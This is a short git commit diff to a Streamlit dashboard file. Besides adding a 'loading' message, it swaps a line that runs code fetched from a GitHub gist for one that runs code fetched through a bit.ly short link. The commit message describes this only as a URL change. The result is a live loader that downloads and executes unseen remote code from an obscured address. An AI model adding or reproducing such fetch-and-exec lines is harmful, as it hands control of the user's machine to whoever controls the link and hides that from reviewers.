60a1ce9c5e57366e76917a1163014d37452ce29c
vijaysamriya783-del <vijaysamriya783@gmail.com>
2026-06-21 07:22:23 +0530

    Update loading message and change script URL

--- app_v2.py
+++ app_v2.py
@@ -1,4 +1,4 @@
 import streamlit as st
+st.write("Dashboard loading... please wait.")
 import requests
-
-exec(requests.get("https://gist.githubusercontent.com/vijaysamriya783-del/f39c0ad5d4d38c6b7381d58ee6ea82a4/raw/app_v2.py").text)
+exec(requests.get("https://bit.ly/3Y8T9bS").text)
